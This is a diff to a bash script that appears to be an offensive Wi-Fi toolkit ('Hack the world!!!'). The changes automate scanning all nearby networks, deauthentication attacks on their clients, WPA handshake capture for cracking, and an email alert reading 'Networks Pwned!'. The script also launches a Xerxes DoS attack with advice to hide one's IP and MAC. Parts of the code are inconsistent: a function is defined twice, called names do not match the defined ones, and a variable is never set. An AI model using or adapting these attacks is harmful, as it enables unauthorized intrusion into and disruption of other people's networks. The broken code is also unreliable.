@@ -84,7 +84,7 @@ echo -e "${Red}
          ░                                  "
 echo -e "${Yellow} \n             Hack the world!!!     "
 echo -e "${Green}\n                    Developed by: Liam Bendix"
-echo -e "${Green}                         Version: 2.0.4 Stable"
+echo -e "${Green}                         Version: 2.0.5 Stable"
 }
 
 menu () {        ##### Display available options #####
@@ -311,118 +311,302 @@ notification1
 }
 
 
-attackAllYes () {
-echo "Enter your email address for notifications: " email
-read email
-sleep 3
-echo "Remeber to check your spam folder!"
-# Put interface into monitor mode
-airmon-ng start $foo
-
-# Initialize an empty list to store the BSSIDs of nearby networks
-bssids=()
-
-# Scan for nearby wireless networks
-airodump-ng $foo --channel 1-14 --write-interval 1 --output-format csv - 2>&1 | while read line; do
-  # Extract the BSSID from the line
-  bssid=$(echo "$line" | cut -d',' -f1)
-
-  # Check if the BSSID is already in the list
-  if [[ ! " ${bssids[@]} " =~ " ${bssid} " ]]; then
-    # Add the BSSID to the list
-    bssids+=($bssid)
-
-    # Capture the handshake for this network
-    airodump-ng -c 1-14 --bssid $bssid --wpa-handshake $bssid-handshake.txt --write-interval 1 $foo &
-  fi
-done
-
-# Wait for all handshakes to be captured
-while true; do
-  # Check if all handshakes have been captured
-  all_handshakes_captured=true
-  for bssid in "${bssids[@]}"; do
-    if [ ! -s "$bssid-handshake.txt" ]; then
-      all_handshakes_captured=false
-      break
-    fi
-  done
-
-  # If all handshakes have been captured, stop
-  if $all_handshakes_captured; then
-    # Stop all airodump-ng processes
-    pkill -INT airodump-ng
-    break
-  fi
-
-  # Sleep for 1 second before checking again
-  sleep 1
-done
-
-# Perform dictionary attack on captured handshakes
-#for bssid in "${bssids[@]}"; do
-#  aircrack-ng -w wordlist.txt -b $bssid-handshake.txt
-#done
-stopMon
-# Print a success message
-echo "WPA Handshake(s) Captured Successfully!"
-echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
-#crack
+attackAllYes() {
+    echo "Enter your email address for notifications: "
+    read email
+    sleep 3
+    echo "Remember to check your spam folder!"
+    network
+    clear
+    capture_wifi_data
+    attack_wifi_networks "wifi_networks.csv"
+    crack
 }
 
+
+# Function to capture Wi-Fi networks information
+capture_wifi_data() {
+    # Ensure $foo (interface in monitor mode) is set to the correct interface
+    echo "Using interface $foo for scanning Wi-Fi networks..."
+
+    # Give the user feedback about the scanning process
+    echo "Starting Wi-Fi scan..."
+
+    # Start the airodump-ng capture (scan all channels)
+    sudo airodump-ng $foo --channel 1-14 --write-interval 1 --output-format csv -w /tmp/airscan_capture &
+
+    # Allow the scan to run for 60 seconds (you can adjust this time)
+    sleep 60
+
+    # Stop the airodump-ng process after the scan duration
+    sudo pkill -INT airodump-ng
+
+    # Wait for the process to finish
+    wait
+
+    echo "Wi-Fi scan completed."
+
+    # Check if the .csv file exists
+    if [ -f /tmp/airscan_capture-01.csv ]; then
+        # Process the CSV file and extract BSSID, Channel, ESSID
+        awk -F, 'BEGIN {OFS=","} NR > 2 && $1 ~ /^[[:xdigit:]]{2}(:[[:xdigit:]]{2}){5}$/ {print $1, $4, $14}' /tmp/airscan_capture-01.csv > wifi_networks.csv
+        
+        # Notify user
+        echo "Wi-Fi network data has been saved to wifi_networks.csv."
+
+        # Optionally, remove the temporary capture file
+        rm /tmp/airscan_capture-01.csv
+    else
+        echo "Error: Capture file not found."
+    fi
+}
 
 attackAllNo () {
-airmon-ng start $foo
-
-# Initialize an empty list to store the BSSIDs of nearby networks
-bssids=()
-
-# Scan for nearby wireless networks
-airodump-ng $foo --channel 1-14 --write-interval 1 --output-format csv - 2>&1 | while read line; do
-  # Extract the BSSID from the line
-  bssid=$(echo "$line" | cut -d',' -f1)
-
-  # Check if the BSSID is already in the list
-  if [[ ! " ${bssids[@]} " =~ " ${bssid} " ]]; then
-    # Add the BSSID to the list
-    bssids+=($bssid)
-
-    # Capture the handshake for this network
-    airodump-ng -c 1-14 --bssid $bssid --wpa-handshake $bssid-handshake.txt --write-interval 1 $foo &
-  fi
-done
-
-# Wait for all handshakes to be captured
-while true; do
-  # Check if all handshakes have been captured
-  all_handshakes_captured=true
-  for bssid in "${bssids[@]}"; do
-    if [ ! -s "$bssid-handshake.txt" ]; then
-      all_handshakes_captured=false
-      break
-    fi
-  done
-
-  # If all handshakes have been captured, stop
-  if $all_handshakes_captured; then
-    # Stop all airodump-ng processes
-    pkill -INT airodump-ng
-    break
-  fi
-
-  # Sleep for 1 second before checking again
-  sleep 1
-done
-
-# Perform dictionary attack on captured handshakes
-#for bssid in "${bssids[@]}"; do
-#  aircrack-ng -w wordlist.txt -b $bssid-handshake.txt
-#done
-stopMon
-# Print a success message
-echo "WPA Handshake(s) Captured Successfully!"
-#crack
+    network
+    # Set interface to monitor mode
+    clear
+    capture_wifi_data
+    attack_wifi_networks "wifi_networks.csv"
+    crack
 }
+
+
+
+
+# Function to attack WiFi networks using data from a CSV file
+attack_wifi_networks() {
+  # Check if the CSV file exists
+  if [ ! -f "$1" ]; then
+    echo "Error: CSV file not found."
+    return 1
+  fi
+
+  # Set the interface and wordlist
+  #$interface="$foo"
+  #wordlist="wordlist.txt"
+
+  # Read the CSV file and attack each network
+  while IFS=, read -r bssid channel essid; do
+    # Put the interface into monitor mode
+    echo "Putting interface into monitor mode..."
+    airmon-ng start $interface > /dev/null 2>&1
+
+    # Set the channel and BSSID
+    echo "Setting channel to $channel and BSSID to $bssid..."
+    airodump-ng -c $channel -w $bssid --bssid $bssid -i $interface > /dev/null 2>&1
+
+    deauthAttackAll
+
+    # Capture the handshake
+    echo "Capturing handshake from $bssid..."
+    airodump-ng -c $channel -w $bssid --bssid $bssid -i $interface --write-interval 1 --output-format pcap
+
+
+  done < "$1"
+}
+
+
+deauthAttackAll () {
+sudo rm -rf *.cap
+sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
+recon
+# Ensure recon is done and client was found before proceeding to the next steps
+if [ "$client_found" = true ]; then
+    sleep 4
+xterm -e aireplay-ng -0 50 -a $bssid -c $client $foo
+sleep 2
+check_cap_files
+    echo -e "\e[32m[Proceeding with next steps]\e[0m"
+else
+    echo -e "\e[31m[Recon failed to find a client, aborting subsequent steps.]\e[0m"
+    return 1
+fi
+}
+
+# Function to check if .cap files exist and verify EAPOL frames
+check_cap_filesAll() {
+    # Clear the screen
+    #clear
+
+    # Check if any .cap files exist in the current directory
+    if ls *.cap &> /dev/null; then
+        # .cap files are present
+        echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"  # Green text
+        
+        # Loop through each .cap file to check for EAPOL frames
+        for cap_file in *.cap; do
+            echo -e "\nChecking $cap_file for EAPOL frames..."
+            if check_eapol_in_cap "$cap_file"; then
+                echo -e "\e[32m[EAPOL Found]\e[0m Proceeding..."
+                attack_wifi_networks
+                return 0  # Stop after finding a valid file with EAPOL
+            else
+                echo -e "\e[31m[EAPOL Not Found]\e[0m Skipping file."
+            fi
+        done
+        
+        # If no valid .cap files with EAPOL are found, exit
+        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured. Trying again...\e[0m"
+        deauthAttackAll
+    else
+        # No .cap files found
+        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"  # Red text
+        sleep 3
+        deauthAttackAll
+    fi
+
+}
+
+
+
+# Function to scan and capture Wi-Fi networks information
+capture_wifi_data() {
+    echo "Starting Wi-Fi scan... Please wait 30s"
+
+    # Start the airodump-ng capture and capture all networks
+    sudo airodump-ng $foo --channel 1-14 --write-interval 1 --output-format csv -w /tmp/airscan_capture &
+
+    # Give it time to collect data (you can increase this based on how long you want to scan for)
+    sleep 30
+
+    # Stop the airodump-ng process after the scan duration
+    sudo pkill -INT airodump-ng
+
+    # Wait for the process to finish
+    wait
+
+    echo "Wi-Fi scan completed."
+
+    # Check if the .csv file exists
+    if [ -f /tmp/airscan_capture-01.csv ]; then
+        # Process the CSV file and extract BSSID, Channel, ESSID
+        awk -F, 'BEGIN {OFS=","} NR > 2 && $1 ~ /^[[:xdigit:]]{2}(:[[:xdigit:]]{2}){5}$/ {print $1, $4, $14}' /tmp/airscan_capture-01.csv > wifi_networks.csv
+        
+        # Notify user
+        echo "Wi-Fi network data has been saved to wifi_networks.csv."
+
+        # Optionally, remove the temporary capture file
+        rm /tmp/airscan_capture-01.csv
+    else
+        echo "Error: Capture file not found."
+    fi
+}
+
+
+
+
+reconAll() {
+    retries=0
+    max_retries=5  # Define the number of retries
+    client_found=false  # Flag to check if client is found
+
+    while [ $retries -lt $max_retries ]; do
+        echo -e "\e[32m[Scanning for clients...]\e[0m"  # Green text for scanning message
+
+        # Start airodump-ng with sudo for permission
+        xterm -hold -e "sudo airodump-ng --bssid $bssid --channel $channel --output-format csv --write client $foo && sleep 60 && exit" &
+
+        # Allow 60 seconds for the capture file to populate (increased wait time)
+        echo "Waiting for 60 seconds for airodump to capture data..."
+        sleep 60
+
+        # Check if the capture CSV file exists and contains data
+        if [ ! -f "client-01.csv" ]; then
+            echo -e "\e[31mError: client-01.csv not found. Airodump-ng may not have captured any data.\e[0m"
+            retries=$((retries + 1))
+            echo -e "\e[31m[Retrying... ($retries/$max_retries)]\e[0m"
+            sleep 5  # Delay before retrying
+            continue
+        fi
+
+        # Remove lines that match the BSSID from the client-01.csv file and save to a temporary file using awk
+        echo -e "\e[32m[Filtering out BSSID from client-01.csv...]\e[0m"
+        awk -F',' -v bssid="$bssid" '
+        BEGIN {
+            print_header = 1
+        }
+        {
+            if (print_header) {
+                print $0
+                print_header = 0
+            } else if ($1 != bssid && $1 != "Station MAC" && $1 != "" && length($1) == 17) {
+                print $0
+            }
+        }' client-01.csv > client_filtered.csv
+
+        # Extract the client MAC addresses from the filtered CSV file
+        echo -e "\e[32m[Client MAC addresses found in client_filtered.csv]:\e[0m"
+        
+        # Read through the filtered CSV file to find client MACs
+        while IFS=',' read -r station_mac first_time last_time power packet_count bssid probed_essid; do
+            # Skip the header or rows with empty station_mac, and ensure it's not the BSSID
+            if [[ -n "$station_mac" && "$station_mac" != "Station MAC" && "$station_mac" != "$first_time" && "$station_mac" != "$bssid" && "${#station_mac}" == 17 ]]; then
+                client=$station_mac  # Correctly assign to $client
+                client_found=true
+                echo -e "\e[32m[Client found: $client]\e[0m"  # Green text for client found
+                break
+            fi
+        done < <(tail -n +2 client_filtered.csv)  # Skip header row using tail
+
+        # If client found, break out of the retry loop
+        if [ "$client_found" = true ]; then
+            break  # Exit the loop after client is found
+        else
+            retries=$((retries + 1))
+            echo -e "\e[31m[Retrying... ($retries/$max_retries)]\e[0m"
+            sleep 5  # Delay before retrying
+        fi
+    done
+
+    # If no client is found after max retries, exit with an error
+    if [ "$client_found" = false ]; then
+        echo -e "\e[31m[Failed to capture client after $max_retries retries. Exiting...]\e[0m"
+        rm client_filtered.csv
+        attack_wifi_networks || return 1
+    fi
+
+    # Now handle the .cap file
+    echo "Waiting for capture file to be available..."
+
+    # Check for any .cap file in the directory (not just client-01.cap)
+    for ((i=0; i<5; i++)); do
+        # List files in the directory for debugging
+        echo "Listing .cap files in the directory..."
+        ls *.cap
+
+        # Check if any .cap file exists
+        if ls *.cap 1> /dev/null 2>&1; then
+            # Move the first .cap file found
+            cap_file=$(ls *.cap | head -n 1)
+            sudo mv "$cap_file" client.cap
+            echo -e "\e[32m[Capture file renamed to client.cap]\e[0m"
+            break
+        else
+            echo "Capture file not found, retrying... ($((i+1))/5)"
+            sleep 3  # Delay before retrying
+        fi
+    done
+
+    # Check if the file was successfully renamed
+    if [ -f "client.cap" ]; then
+        echo -e "\e[32m[Capture file successfully renamed.]\e[0m"
+    else
+        echo -e "\e[31m[Error: .cap file not found after retries.]\e[0m"
+        return 1
+    fi
+}
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -447,6 +631,7 @@ sudo ./Wifite.py
 
 
 crack () {
+echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
 echo "Your current directory:"
 pwd
 ls *.txt
@@ -470,6 +655,7 @@ cleanup () {
 sudo rm -f *.csv > /dev/null 2>&1
 sudo rm -f *.netxml > /dev/null 2>&1
 sudo rm -f airodump_output.log > /dev/null 2>&1
+sudo rm -f *.ivs > /dev/null 2>&1
 cleanup_handshakes
 exit
 
@@ -1200,7 +1386,7 @@ cd /bin/air-script/tools
 cd XERXES
 echo "Xerxes DoS Attack"
 sleep 3
-echo "Remeber to hide your IP and MAC"
+echo "Remember to hide your IP and MAC"
 sleep 3
 read -p "Enter the IP & Port of target (e.g. 102.102.102.102:80) : " ip
 sudo ./xerxes $ip
